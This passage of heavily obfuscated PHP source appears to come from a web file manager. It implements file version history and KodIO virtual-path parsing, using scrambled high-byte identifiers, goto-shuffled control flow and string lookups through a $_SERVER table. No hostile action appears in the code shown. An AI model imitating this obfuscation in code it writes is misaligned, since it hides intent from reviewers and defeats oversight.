A¤ÌôÏµÉ¸: $f×²‰çíçÀ =& $_SERVER[æ§›¦ÌáØ]; $dÅæ¼ìá‘¿ = self::listData($Fè£à­ ª); if (!$dÅæ¼ìá‘¿) { return; } goto cä«Ş¿äÓ»; Aè…ª¥öÁÛ: $b˜ÚçÄ¹„– = $dÅæ¼ìá‘¿[$f×²‰çíçÀ[367]]; if ($BÕˆÑš¤[$f×²‰çíçÀ[78]] == 0) { return; } if ($BÕˆÑš¤[$f×²‰çíçÀ[78]] >= 1024 * 1024 * 500) { return !1; } goto BÜ‘²»£–‚; cä«Ş¿äÓ»: $F‘è—®ë‹ = Model($f×²‰çíçÀ[723])->get($f×²‰çíçÀ[1116]); $f‹½è’µ˜Ù = $GLOBALS[$f×²‰çíçÀ[6]][$f×²‰çíçÀ[88]][$f×²‰çíçÀ[1094]]; $DòÕíã­§’ = $F‘è—®ë‹ == $f×²‰çíçÀ[1117] ? 5 : $f‹½è’µ˜Ù; goto DğèÊóßƒ¾; BÜ‘²»£–‚: if ($b˜ÚçÄ¹„– && $b˜ÚçÄ¹„–[0][$f×²‰çíçÀ[171]] == $AÜÉ»™ŒÀ) { return !0; } if (array_key_exists($f×²‰çíçÀ[196], $BÕˆÑš¤) && !$BÕˆÑš¤[$f×²‰çíçÀ[196]]) { return !1; } $BÉÊ´İñå… = short_id(time()); goto AÊ†Š¼„ ; dçñ²ØİĞ: if (!$cƒô‰ÛÛØÒ) { self::clearEmptyFolder($dÅæ¼ìá‘¿[$f×²‰çíçÀ[1120]]); return !1; } array_unshift($b˜ÚçÄ¹„–, $EÙÏ—²»); if (count($b˜ÚçÄ¹„–) > $DòÕíã­§’) { $AåÅ¶§É„ø = array_slice($b˜ÚçÄ¹„–, $DòÕíã­§’); foreach ($AåÅ¶§É„ø as $e‹¤‚©´¼) { IO::remove($dÅæ¼ìá‘¿[$f×²‰çíçÀ[1120]] . $e‹¤‚©´¼[$f×²‰çíçÀ[28]]); } $b˜ÚçÄ¹„– = array_slice($b˜ÚçÄ¹„–, 0, $DòÕíã­§’); } goto dàÔµ–‚ÃÙ; AÊ†Š¼„ : $EÙÏ—²» = array($f×²‰çíçÀ[393] => $BÉÊ´İñå…, $f×²‰çíçÀ[171] => $AÜÉ»™ŒÀ, $f×²‰çíçÀ[28] => $BÕˆÑš¤[$f×²‰çíçÀ[28]] . $f×²‰çíçÀ[95] . date($f×²‰çíçÀ[1118]) . rand_string(1), $f×²‰çíçÀ[78] => $BÕˆÑš¤[$f×²‰çíçÀ[78]], $f×²‰çíçÀ[432] => USER_ID, $f×²‰çíçÀ[194] => time(), $f×²‰çíçÀ[1119] => $f×²‰çíçÀ[33]); IO::mkdir($dÅæ¼ìá‘¿[$f×²‰çíçÀ[1120]]); $cƒô‰ÛÛØÒ = IO::copy($Fè£à­ ª, $dÅæ¼ìá‘¿[$f×²‰çíçÀ[1120]], !1, $EÙÏ—²»[$f×²‰çíçÀ[28]]); goto dçñ²ØİĞ; DğèÊóßƒ¾: if ($f‹½è’µ˜Ù <= 0) { return; } $AÜÉ»™ŒÀ = IO::hashSimple($Fè£à­ ª); $BÕˆÑš¤ = IO::info($Fè£à­ ª); goto Aè…ª¥öÁÛ; B‹©Æô¡óõ: } public static function remove($E¥¨¯ÀâÅ³, $a‰®Œ¬ƒî) { $EäÖ¸š„Íö =& $_SERVER[æ§›¦ÌáØ]; $E¿…ø‹êãÙ = self::listData($E¥¨¯ÀâÅ³); $E†„™çğÚ† = array(); if (!$E¿…ø‹êãÙ) { return !1; } foreach ($E¿…ø‹êãÙ[$EäÖ¸š„Íö[367]] as $fÙë‘îïà³) { if ($fÙë‘îïà³[$EäÖ¸š„Íö[393]] == $a‰®Œ¬ƒî) { IO::remove($E¿…ø‹êãÙ[$EäÖ¸š„Íö[1120]] . $fÙë‘îïà³[$EäÖ¸š„Íö[28]]); continue; } $E†„™çğÚ†[] = $fÙë‘îïà³; } return self::saveData($E¿…ø‹êãÙ[$EäÖ¸š„Íö[1121]], $E†„™çğÚ†); } public static function clear($bãê°Æõ, $bõĞè—î‹— = true) { $CİØ×‘ÍÆ =& $_SERVER[æ§›¦ÌáØ]; $bµØï‡½—¢ = self::listData($bãê°Æõ, $bõĞè—î‹—); if (!$bµØï‡½—¢) { return !1; } foreach ($bµØï‡½—¢[$CİØ×‘ÍÆ[367]] as $a¯“±‘É·) { IO::remove($bµØï‡½—¢[$CİØ×‘ÍÆ[1120]] . $a¯“±‘É·[$CİØ×‘ÍÆ[28]]); } return self::saveData($bµØï‡½—¢[$CİØ×‘ÍÆ[1121]], array()); } public static function moveHistory($b¶ªİÇ¬ÚÉ, $aÌ†‰ßù â = '', $fòŸ˜›Ò„ = '') { goto CƒçòÇšŒ·; Fñå¢¹ˆ—İ: $e…á¹É¿’Š = $bËğÂîÚ[1108]; $aÌ†‰ßù â = $aÌ†‰ßù â ? $aÌ†‰ßù â : get_path_this($b¶ªİÇ¬ÚÉ); $fòŸ˜›Ò„ = $fòŸ˜›Ò„ ? $fòŸ˜›Ò„ : $aéÙÙÜÙº˜[$bËğÂîÚ[1120]]; goto båº¡Åœæ; båº¡Åœæ: $c«°£›‰¥– = substr(get_path_this($aéÙÙÜÙº˜[$bËğÂîÚ[1121]]), 0, -strlen($e…á¹É¿’Š)); foreach ($aéÙÙÜÙº˜[$bËğÂîÚ[367]] as $a¿Š¹ÊÅ±° => $aøÓÒÙÖ¾Æ) { $d³™ ÑÕ•œ = $aÌ†‰ßù â . substr($aøÓÒÙÖ¾Æ[$bËğÂîÚ[28]], strlen($c«°£›‰¥–)); $DºÇ‡£¹áë = IO::move($aéÙÙÜÙº˜[$bËğÂîÚ[1120]] . $aøÓÒÙÖ¾Æ[$bËğÂîÚ[28]], $fòŸ˜›Ò„, !1, $d³™ ÑÕ•œ); if ($DºÇ‡£¹áë) { $aéÙÙÜÙº˜[$bËğÂîÚ[367]][$a¿Š¹ÊÅ±°][$bËğÂîÚ[28]] = $d³™ ÑÕ•œ; } } $aéÙÙÜÙº˜[$bËğÂîÚ[1121]] = IO::move($aéÙÙÜÙº˜[$bËğÂîÚ[1121]], $fòŸ˜›Ò„, !1, $aÌ†‰ßù â . $e…á¹É¿’Š); goto eÊÏÓœêŠ½; CƒçòÇšŒ·: $bËğÂîÚ =& $_SERVER[æ§›¦ÌáØ]; $aéÙÙÜÙº˜ = self::listData($b¶ªİÇ¬ÚÉ, !1); if (!$aéÙÙÜÙº˜ || !$aéÙÙÜÙº˜[$bËğÂîÚ[367]]) { return !1; } goto Fñå¢¹ˆ—İ; eÊÏÓœêŠ½: self::saveData($aéÙÙÜÙº˜[$bËğÂîÚ[1121]], $aéÙÙÜÙº˜[$bËğÂîÚ[367]]); self::clearEmptyFolder($aéÙÙÜÙº˜[$bËğÂîÚ[1120]]); goto cİ¦Íáò÷; cİ¦Íáò÷: } public static function rollback($bÛãÂ°öÛÂ, $d£é™²£Í…) { $B¼°ÊöÜˆ› =& $_SERVER[æ§›¦ÌáØ]; $EÀŸÏÌç›¸ = self::listData($bÛãÂ°öÛÂ); if (!$EÀŸÏÌç›¸) { return; } $f„îÎšóŸÒ = IO::info($bÛãÂ°öÛÂ); foreach ($EÀŸÏÌç›¸[$B¼°ÊöÜˆ›[367]] as $BÑŠ¾¯Ñ– => $c¡åá˜´”ë) { if ($c¡åá˜´”ë[$B¼°ÊöÜˆ›[393]] == $d£é™²£Í…) { self::add($bÛãÂ°öÛÂ); $cò©¡°Òé… = $EÀŸÏÌç›¸[$B¼°ÊöÜˆ›[1120]] . $c¡åá˜´”ë[$B¼°ÊöÜˆ›[28]]; $e§ùŠº«†ù = IO::copy($cò©¡°Òé…, IO::pathFather($bÛãÂ°öÛÂ), REPEAT_REPLACE, $f„îÎšóŸÒ[$B¼°ÊöÜˆ›[28]]); if ($e§ùŠº«†ù) { self::remove($bÛãÂ°öÛÂ, $d£é™²£Í…); } return $e§ùŠº«†ù; } } return !1; } public static function setDetail($bïÖù Ú·, $Cèº¯‘ÂÏ®, $B‹æäã«š) { $cÅÀ–Û¬Õˆ =& $_SERVER[æ§›¦ÌáØ]; $e©Îª•Á§ = self::listData($bïÖù Ú·); if (!$e©Îª•Á§) { return; } foreach ($e©Îª•Á§[$cÅÀ–Û¬Õˆ[367]] as $DÑˆÉŒŠÙª => $F‡‰·ÅĞ‘Á) { if ($F‡‰·ÅĞ‘Á[$cÅÀ–Û¬Õˆ[393]] == $Cèº¯‘ÂÏ®) { $e©Îª•Á§[$cÅÀ–Û¬Õˆ[367]][$DÑˆÉŒŠÙª][$cÅÀ–Û¬Õˆ[1119]] = $B‹æäã«š; self::saveData($e©Îª•Á§[$cÅÀ–Û¬Õˆ[1121]], $e©Îª•Á§[$cÅÀ–Û¬Õˆ[367]]); return !0; } } return !1; } public static function fileInfo($E¡Ôõ¬×”‹, $e¶óˆ¾ƒ½è) { goto eà‰•“›…; D÷ÃòÑô×: return IO::info($c¤¸½°âÔ); goto d¤„›ÒÏöÅ; eà‰•“›…: $dÑÓ•“îù² =& $_SERVER[æ§›¦ÌáØ]; $e‹¡÷ØÖ‰ = self::listData($E¡Ôõ¬×”‹); if (!$e‹¡÷ØÖ‰) { show_json(LNG($dÑÓ•“îù²[105]), !1); } goto eÎÁ“­ï è; eÎÁ“­ï è: $c¤¸½°âÔ = $dÑÓ•“îù²[33]; foreach ($e‹¡÷ØÖ‰[$dÑÓ•“îù²[367]] as $f³²ÉËÎ– => $FŒøòªÆÎ÷) { if ($FŒøòªÆÎ÷[$dÑÓ•“îù²[393]] != $e¶óˆ¾ƒ½è) { continue; } $c¤¸½°âÔ = $e‹¡÷ØÖ‰[$dÑÓ•“îù²[1120]] . $FŒøòªÆÎ÷[$dÑÓ•“îù²[28]]; break; } if (!$c¤¸½°âÔ) { show_json(LNG($dÑÓ•“îù²[105]), !1); } goto D÷ÃòÑô×; d¤„›ÒÏöÅ: } public static function fileOut($Fë‚Ñ¥•–İ, $b›ÆÇóîÁè, $fªæ÷­‰¼ä = false) { $FØ‡Ç±¶– =& $_SERVER[æ§›¦ÌáØ]; $FëéÄÎ‘¥‚ = self::fileInfo($Fë‚Ñ¥•–İ, $b›ÆÇóîÁè); $b¶’¤ÒŞ’ =& $GLOBALS[$FØ‡Ç±¶–[7]]; $fªæ÷­‰¼ä = isset($b¶’¤ÒŞ’[$FØ‡Ç±¶–[1084]]) && $b¶’¤ÒŞ’[$FØ‡Ç±¶–[1084]] == 1; if (isset($b¶’¤ÒŞ’[$FØ‡Ç±¶–[29]]) && $b¶’¤ÒŞ’[$FØ‡Ç±¶–[29]] == $FØ‡Ç±¶–[1122]) { return IO::fileOutImage($FëéÄÎ‘¥‚[$FØ‡Ç±¶–[76]], $b¶’¤ÒŞ’[$FØ‡Ç±¶–[1123]]); } IO::fileOut($FëéÄÎ‘¥‚[$FØ‡Ç±¶–[76]], $fªæ÷­‰¼ä, get_path_this($Fë‚Ñ¥•–İ)); } public static function listData($AÖñî…Ä“ğ, $D“èµ›å„  = true) { goto A‘…ŠƒÎ‰; cĞ¡ØãÁ—ß: $Cìã×ùÚƒŒ = IO::getContent($BÖôæä®µ[$bßŸ»óƒ[1121]]); if ($Cìã×ùÚƒŒ) { $f·î„«Ø¨Æ = json_decode($Cìã×ùÚƒŒ, !0); if (is_array($f·î„«Ø¨Æ)) { $BÖôæä®µ[$bßŸ»óƒ[367]] = $f·î„«Ø¨Æ; } } return $BÖôæä®µ; goto c†­Ãô»†; A‘…ŠƒÎ‰: $bßŸ»óƒ =& $_SERVER[æ§›¦ÌáØ]; if ($D“èµ›å„  && !IO::exist($AÖñî…Ä“ğ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto C†™µ·»£Ä; C†™µ·»£Ä: if (substr($AÖñî…Ä“ğ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $f¥ªåŒ¾ÓĞ = self::pathHistory($AÖñî…Ä“ğ); $BÖôæä®µ = array($bßŸ»óƒ[1121] => $f¥ªåŒ¾ÓĞ . $bßŸ»óƒ[1108], $bßŸ»óƒ[1120] => rtrim(get_path_father($f¥ªåŒ¾ÓĞ), $bßŸ»óƒ[8]) . $bßŸ»óƒ[8], $bßŸ»óƒ[367] => array()); goto cĞ¡ØãÁ—ß; c†­Ãô»†: } private static function saveData($F¼ ÍƒÈÇ„, $Dİ’±—Øà˜) { goto e­Äì²ğì„; cÅƒ‚›‘°: return !0; goto Aæ±÷ºóŠ; AÃ¼µ«ÏˆÖ: $BÒøŠŒŞä = IO::pathFather($F¼ ÍƒÈÇ„); IO::remove($F¼ ÍƒÈÇ„); self::clearEmptyFolder($BÒøŠŒŞä); goto cÅƒ‚›‘°; e­Äì²ğì„: $EË¿ôˆ‚† =& $_SERVER[æ§›¦ÌáØ]; self::log($EË¿ôˆ‚†[1124] . $F¼ ÍƒÈÇ„ . $EË¿ôˆ‚†[68] . count($Dİ’±—Øà˜), $EË¿ôˆ‚†[705]); if ($Dİ’±—Øà˜) { return IO::setContent($F¼ ÍƒÈÇ„, json_encode($Dİ’±—Øà˜)); } goto AÃ¼µ«ÏˆÖ; Aæ±÷ºóŠ: } public static function clearEmptyFolder($ağ’·Ä¬¢´) { goto eØÓñØ˜òš; fÖÜ°ÒöÌ˜: $bˆîÕŸÄ‹Ó = IO::has($ağ’·Ä¬¢´, !0); if ($bˆîÕŸÄ‹Ó[$eùÀŠğš©Ş[203]] > 0 || $bˆîÕŸÄ‹Ó[$eùÀŠğš©Ş[204]] > 0) { return; } IO::remove($ağ’·Ä¬¢´); goto c‘Ÿ–ÖùØ§; c‘Ÿ–ÖùØ§: self::clearEmptyFolder($C—ø‡—ƒœà); goto eñŠ‰æÔÚ›; eØÓñØ˜òš: $eùÀŠğš©Ş =& $_SERVER[æ§›¦ÌáØ]; if (trim($ağ’·Ä¬¢´, $eùÀŠğš©Ş[8]) == trim(self::$_historyBase, $eùÀŠğš©Ş[8])) { return; } $C—ø‡—ƒœà = IO::pathFather($ağ’·Ä¬¢´); goto fÖÜ°ÒöÌ˜; eñŠ‰æÔÚ›: } private static function getBasePath() { goto fØ™£ÑøÒÙ; B‡ª†éÃ¢: file_put_contents($c“º¬øœ» . $cª±ŸáÊØË[1128], $cª±ŸáÊØË[33]); file_put_contents(DATA_PATH . $cª±ŸáÊØË[1128], $cª±ŸáÊØË[33]); Model($cª±ŸáÊØË[1125])->set($cª±ŸáÊØË[1126], $c“º¬øœ»); goto B‰‚»Å¶´ã; cºó–ŠÕË‹: $c“º¬øœ» = DATA_PATH . $cª±ŸáÊØË[1127] . rand_string(8) . $cª±ŸáÊØË[8]; $c“º¬øœ» = IO::mkdir($c“º¬øœ»); $c“º¬øœ» = rtrim($c“º¬øœ», $cª±ŸáÊØË[8]) . $cª±ŸáÊØË[8]; goto B‡ª†éÃ¢; B‰‚»Å¶´ã: return $c“º¬øœ»; goto Cî×æøİ´ˆ; fØ™£ÑøÒÙ: $cª±ŸáÊØË =& $_SERVER[æ§›¦ÌáØ]; $c“º¬øœ» = Model($cª±ŸáÊØË[1125])->get($cª±ŸáÊØË[1126]); if ($c“º¬øœ») { if (!IO::exist($c“º¬øœ»)) { IO::mkdir($c“º¬øœ»); } if (get_path_this($c“º¬øœ») == $cª±ŸáÊØË[1111]) { $aŠ°áÅ«ïˆ = $cª±ŸáÊØË[1127] . rand_string(8); @rename($c“º¬øœ», get_path_father($c“º¬øœ») . $cª±ŸáÊØË[8] . $aŠ°áÅ«ïˆ); $c“º¬øœ» = DATA_PATH . $aŠ°áÅ«ïˆ . $cª±ŸáÊØË[8]; file_put_contents(DATA_PATH . $cª±ŸáÊØË[1128], $cª±ŸáÊØË[33]); Model($cª±ŸáÊØË[1125])->set($cª±ŸáÊØË[1126], $c“º¬øœ»); } return $c“º¬øœ»; } goto cºó–ŠÕË‹; Cî×æøİ´ˆ: } } class KodIO { const KOD_SOURCE = "\173\163\x6f\165\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\162\x52\145\143\x79\x63\154\145\175"; const KOD_USER_FAV = "\x7b\x75\x73\145\x72\x46\x61\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\162\106\151\154\145\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\163\x65\x72\x46\151\x6c\x65\x54\171\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\165\x70\x52\x6f\x6f\164\x53\x65\154\146\x7d"; const KOD_USER_SHARE = "\x7b\165\163\x65\162\123\150\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\x65\162\x53\x68\x61\x72\x65\x4c\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\x72\145\x54\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\162\145\x49\164\145\155\x7d"; const KOD_SHARE_LINK = "\173\163\150\141\x72\x65\111\x74\145\155\114\x69\x6e\x6b\x7d"; const KOD_SEARCH = "\173\x73\145\141\162\x63\150\175"; const KOD_BLOCK = "\x7b\142\154\x6f\x63\153\175"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\x7b\165\x73\145\x72\122\145\156\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\151\166\145\x72\x7d"; public static function typeList() { $dÁ¾ÌëÓ­ =& $_SERVER[æ§›¦ÌáØ]; return array($dÁ¾ÌëÓ­[1129] => self::KOD_SOURCE, $dÁ¾ÌëÓ­[1130] => self::KOD_USER_RECYCLE, $dÁ¾ÌëÓ­[1131] => self::KOD_USER_FAV, $dÁ¾ÌëÓ­[1132] => self::KOD_USER_FILE_TAG, $dÁ¾ÌëÓ­[1133] => self::KOD_USER_FILE_TYPE, $dÁ¾ÌëÓ­[1134] => self::KOD_GROUP_ROOT_SELF, $dÁ¾ÌëÓ­[1135] => self::KOD_USER_SHARE, $dÁ¾ÌëÓ­[1136] => self::KOD_USER_SHARE_LINK, $dÁ¾ÌëÓ­[1137] => self::KOD_USER_SHARE_TO_ME, $dÁ¾ÌëÓ­[1138] => self::KOD_SHARE_ITEM, $dÁ¾ÌëÓ­[1139] => self::KOD_SHARE_LINK, $dÁ¾ÌëÓ­[1140] => self::KOD_SEARCH, $dÁ¾ÌëÓ­[1141] => self::KOD_BLOCK, $dÁ¾ÌëÓ­[1142] => self::KOD_IO, $dÁ¾ÌëÓ­[1143] => self::KOD_USER_RECENT, $dÁ¾ÌëÓ­[1144] => self::KOD_USER_DRIVER); } public static function parse($d¢¬Ş²¾”›) { goto BŒ•—Ò‘ò¼; BŒ•—Ò‘ò¼: $A¨èÜ˜  =& $_SERVER[æ§›¦ÌáØ]; $d¢¬Ş²¾”› = self::clear($d¢¬Ş²¾”›); $D±Ã¦¯¶» = array_values(self::typeList()); goto bˆŒ²…‘„‰; bˆŒ²…‘„‰: preg_match($A¨èÜ˜ [1145], $d¢¬Ş²¾”›, $DÕÎé¾•è); $cÕ£ÏÆ¸ŸØ = array($A¨èÜ˜ [415] => !1, $A¨èÜ˜ [1146] => !1, $A¨èÜ˜ [412] => !1, $A¨èÜ˜ [76] => $d¢¬Ş²¾”›, $A¨èÜ˜ [1055] => !1, $A¨èÜ˜ [1054] => $A¨èÜ˜ [33]); if (is_array($DÕÎé¾•è) && count($DÕÎé¾•è) == 5) { $Bƒ¤¸‡ÜñÀ = $A¨èÜ˜ [1147] . $DÕÎé¾•è[2] . $A¨èÜ˜ [325]; if (in_array($Bƒ¤¸‡ÜñÀ, $D±Ã¦¯¶»)) { $cÕ£ÏÆ¸ŸØ[$A¨èÜ˜ [1055]] = $DÕÎé¾•è[1]; $cÕ£ÏÆ¸ŸØ[$A¨èÜ˜ [29]] = $Bƒ¤¸‡ÜñÀ; $cÕ£ÏÆ¸ŸØ[$A¨èÜ˜ [1148]] = substr($Bƒ¤¸‡ÜñÀ, 1, -1); $cÕ£ÏÆ¸ŸØ[$A¨èÜ˜ [393]] = $DÕÎé¾•è[3]; } $cÕ£ÏÆ¸ŸØ[$A¨èÜ˜ [1054]] = $DÕÎé¾•è[4]; } goto F²Ó¼Ÿ»’; F²Ó¼Ÿ»’: $bšìÌ„½› = array($A¨èÜ˜ [33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $cÕ£ÏÆ¸ŸØ[$A¨èÜ˜ [1110]] = in_array($cÕ£ÏÆ¸ŸØ[$A¨èÜ˜ [29]], $bšìÌ„½›); return $cÕ£ÏÆ¸ŸØ; goto Fôòé”‹äÆ; Fôòé”‹äÆ: } public static function isTruePath($Cƒí¼Õòˆ) { goto aÌ“ë²“ì; a¤œºŸØğ¦: if (strpos($Cƒí¼Õòˆ, $AŸ‘¢‚±àğ[1151]) === 0) { return !0; } return !1; goto DïŒ†¸…î; aÌ“ë²“ì: $AŸ‘¢‚±àğ =& $_SERVER[æ§›¦ÌáØ]; if (substr($Cƒí¼Õòˆ, 0, 1) != $AŸ‘¢‚±àğ[1147]) { return !0; } if (strpos($Cƒí¼Õòˆ, $AŸ‘¢‚±àğ[401]) === 0) { return !0; } goto BÛ³äç·Õ; BÛ³äç·Õ: if (strpos($Cƒí¼Õòˆ, $AŸ‘¢‚±àğ[1114]) === 0) { return !0; } if (strpos($Cƒí¼Õòˆ, $AŸ‘¢‚±àğ[1149]) === 0) { return !0; } if (strpos($Cƒí¼Õòˆ, $AŸ‘¢‚±àğ[1150]) === 0) { return !0; } goto a¤œºŸØğ¦; DïŒ†¸…î: } public static function clear($D¸ï²œ‡ÈÖ) { goto DÀÄ‰ŞÇ¨ï; DÀÄ‰ŞÇ¨ï: $d«–×Ò½ =& $_SERVER[æ§›¦ÌáØ]; $D¸ï²œ‡ÈÖ = str_replace(array($d«–×Ò½[1028], $d«–×Ò½[229]), $d«–×Ò½[50], $D¸ï²œ‡ÈÖ); $D¸ï²œ‡ÈÖ = str_replace($d«–×Ò½[97], $d«–×Ò½[8], $D¸ï²œ‡ÈÖ); goto eøŞ‹­¹”–; aŞùÓÇ»ª½: $D¸ï²œ‡ÈÖ = preg_replace($d«–×Ò½[1154], $d«–×Ò½[8], $D¸ï²œ‡ÈÖ); if ($D¸ï²œ‡ÈÖ == $d«–×Ò½[8]) { return $d«–×Ò½[8]; } $D¸ï²œ‡ÈÖ = rtrim($D¸ï²œ‡ÈÖ, $d«–×Ò½[8]); goto eÙ‡ËÇğ£¡; eÙ‡ËÇğ£¡: return $D¸ï²œ‡ÈÖ; goto dóŒÎì×½; eøŞ‹­¹”–: $F„ñœô‚—Í = $d«–×Ò½[1152]; if (substr($D¸ï²œ‡ÈÖ, 0, 3) == $d«–×Ò½[1153]) { $D¸ï²œ‡ÈÖ = substr($D¸ï²œ‡ÈÖ, 3); } while (strstr($D¸ï²œ‡ÈÖ, $F„ñœô‚—Í)) { $D¸ï²œ‡ÈÖ = str_replace($F„ñœô‚—Í, $d«–×Ò½[8], $D¸ï²œ‡ÈÖ); } goto aŞùÓÇ»ª½; dóŒÎì×½: } public static function sourceID($cêÀ ‚†Âì) { $cÑ’Œ¼¼¾ =& $_SERVER[æ§›¦ÌáØ]; $a¢›È—ÎŒÑ = self::parse($cêÀ ‚†Âì); if ($a¢›È—ÎŒÑ[$cÑ’Œ¼¼¾[29]] !== self::KOD_SOURCE) { show_json(LNG($cÑ’Œ¼¼¾[1155]), !1); } return $a¢›È—ÎŒÑ[$cÑ’Œ¼¼¾[393]]; } public static function make($f†é‘¼Ò) { if (!$f†é‘¼Ò) { return !1; } return self::makePath(self::KOD_SOURCE, intval($f†é‘¼Ò)); } public static function makeShare($DëˆŠÁï, $b‹ç’éØ†â) { return self::makePath(self::KOD_SHARE_ITEM, $DëˆŠÁï, $b‹ç’éØ†â); } public static function makeFileTypePath($bÏÁÊÜ©¢) { return self::makePath(self::KOD_USER_FILE_TYPE, $bÏÁÊÜ©¢); } public static function makeFileTagPath($DøÎ­æåÍ·) { return self::makePath(self::KOD_USER_FILE_TAG, $DøÎ­æåÍ·); } public static function makePath($aõĞ˜Ï·ø, $E™ÊÈÏèŠ† = '', $Eåõä¨„¿Î = '') { $Eé³õò¡œ =& $_SERVER[æ§›¦ÌáØ]; $DëĞøÇ™‚ = substr($aõĞ˜Ï·ø, 1, -1); $BÍÍÜÉ“ã¯ = $Eé³õò¡œ[1156] . $DëĞøÇ™‚ . $Eé³õò¡œ[1157] . $E™ÊÈÏèŠ† . $Eé³õò¡œ[1158]; $BÍÍÜÉ“ã¯ = $Eåõä¨„¿Î ? $BÍÍÜÉ“ã¯ . $Eåõä¨„¿Î . $Eé³õò¡œ[8] : $BÍÍÜÉ“ã¯; return $BÍÍÜÉ“ã¯; } public static function hashPath($e˜íÏ®„Ø„, $DâİŒõ¦Ô = true) { goto b˜Í–ğÁó ; dêŞÜì×°¢: if (!$Bæ±½Ä Ö && isset($e‘ãÂå£…­[$FæõĞœ±[395]])) { $e‘ãÂå£…­ = IO::info(KodIO::make($e‘ãÂå£…­[$FæõĞœ±[395]])); $Bæ±½Ä Ö = _get($e‘ãÂå£…­, $FæõĞœ±[1159], $FæõĞœ±[33]); } if (!$Bæ±½Ä Ö && $DâİŒõ¦Ô) { $f‚Â±ª = KodIO::parse($e‘ãÂå£…­[$FæõĞœ±[76]]); if (!$f‚Â±ª[$FæõĞœ±[29]]) { $Bæ±½Ä Ö = IO::hashSimple($e‘ãÂå£…­[$FæõĞœ±[76]]); } } if (!$Bæ±½Ä Ö) { $Bæ±½Ä Ö = md5($e‘ãÂå£…­[$FæõĞœ±[76]] . $e‘ãÂå£…­[$FæõĞœ±[78]] . $e‘ãÂå£…­[$FæõĞœ±[84]]); } goto F—ö¼©”¼‡; b˜Í–ğÁó : $FæõĞœ± =& $_SERVER[æ§›¦ÌáØ]; $e‘ãÂå£…­ = is_array($e˜íÏ®„Ø„) ? $e˜íÏ®„Ø„ : IO::info($e˜íÏ®„Ø„); $Bæ±½Ä Ö = _get($e‘ãÂå£…­, $FæõĞœ±[1159], $FæõĞœ±[33]); goto dêŞÜì×°¢; F—ö¼©”¼‡: return $Bæ±½Ä Ö; goto E¹ŠÄŞŠ»®; E¹ŠÄŞŠ»®: } public static function initSystemPath() { goto AÉ•‹ë¾; f‹ß¼ò³™¿: define($c¸ê—ó®ö[1162], self::systemPath($c¸ê—ó®ö[1163])); define($c¸ê—ó®ö[1164], self::systemPath($c¸ê—ó®ö[1165])); define($c¸ê—ó®ö[1166], self::systemPath($c¸ê—ó®ö[1167])); goto EâàÜ¬Íƒ; AÉ•‹ë¾: $c¸ê—ó®ö =& $_SERVER[æ§›¦ÌáØ]; if (defined($c¸ê—ó®ö[1160])) { return; } define($c¸ê—ó®ö[1160], self::systemPath($c¸ê—ó®ö[1161])); goto f‹ß¼ò³™¿; EâàÜ¬Íƒ: IOHistory::bindEvent(); goto C¼”¨¿¸ø”; C¼”¨¿¸ø”: } public static function systemPath($CßÒ‰˜¡ğ) { goto DøÌÎˆî‹ï; DÇì¨Ÿä: if ($A”µ¯¾©ÛÛ) { return $A”µ¯¾©ÛÛ; } if ($CßÒ‰˜¡ğ == $bó÷òÚå[1161]) { $A”µ¯¾©ÛÛ = self::make(Model($bó÷òÚå[783])->systemRootPathAdd($bó÷òÚå[518])); } else { $A”µ¯¾©ÛÛ = self::systemPath($bó÷òÚå[1161]); $bß‹¡ğŠø = self::sourceID($A”µ¯¾©ÛÛ); $A”µ¯¾©ÛÛ = self::make(Model($bó÷òÚå[783])->mkdir($bß‹¡ğŠø, $CßÒ‰˜¡ğ)); } Model($bó÷òÚå[723])->set($cÏÈ‚×Âì, $A”µ¯¾©ÛÛ); goto fÓ‰ÓÚêÍ; fÓ‰ÓÚêÍ: return $A”µ¯¾©ÛÛ; goto CƒøŞ¡³ï; DøÌÎˆî‹ï: $bó÷òÚå =& $_SERVER[æ§›¦ÌáØ]; $cÏÈ‚×Âì = $bó÷òÚå[1168] . ucfirst($CßÒ‰˜¡ğ); $A”µ¯¾©ÛÛ = Model($bó÷òÚå[723])->get($cÏÈ‚×Âì); goto DÇì¨Ÿä; CƒøŞ¡³ï: } public static function systemFolder($eá¸Òä šâ) { $B¼ˆÙœ¬ä¥ = IO_PATH_SYSTEM_SOURCE . $eá¸Òä šâ; $c¿“å¤‚İ = Cache::get($B¼ˆÙœ¬ä¥); if (!$c¿“å¤‚İ) { $C–‚¢ááµ° = IO::infoFull($B¼ˆÙœ¬ä¥); if (!$C–‚¢ááµ°) { $c¿“å¤‚İ = IO::mkdir($B¼ˆÙœ¬ä¥, REPEAT_SKIP); } else { $c¿“å¤‚İ = $C–‚¢ááµ°[$_SERVER[æ§›¦ÌáØ][76]]; } Cache::set($B¼ˆÙœ¬ä¥, $c¿“å¤‚İ, 3600 * 10); } return $c¿“å¤‚İ; } public static function defaultDriver() { return Model($_SERVER[æ§›¦ÌáØ][720])->defaultDriver(); } public static function defaultIO() { $b¢Ö†šÅ¹ =& $_SERVER[æ§›¦ÌáØ]; $cƒƒ„íòÑé = self::defaultDriver(); return $b¢Ö†šÅ¹[1169] . $cƒƒ„íòÑé[$b¢Ö†šÅ¹[393]] . $b¢Ö†šÅ¹[1158]; } public static function defaultDriverInit() { static $DœçÖİã–² = false; if ($DœçÖİã–²) { return $DœçÖİã–²; } $DœçÖİã–² = IO::init(self::defaultIO()); return $DœçÖİã–²; } public static function fileTypeList() { $Fõ¥Ë’¬Ê =& $_SERVER[æ§›¦ÌáØ]; $eÄ™Ö§É§ = $GLOBALS[$Fõ¥Ë’¬Ê[6]][$Fõ¥Ë’¬Ê[1170]]; foreach ($eÄ™Ö§É§ as $eæØÒÇ¾Ì¶ 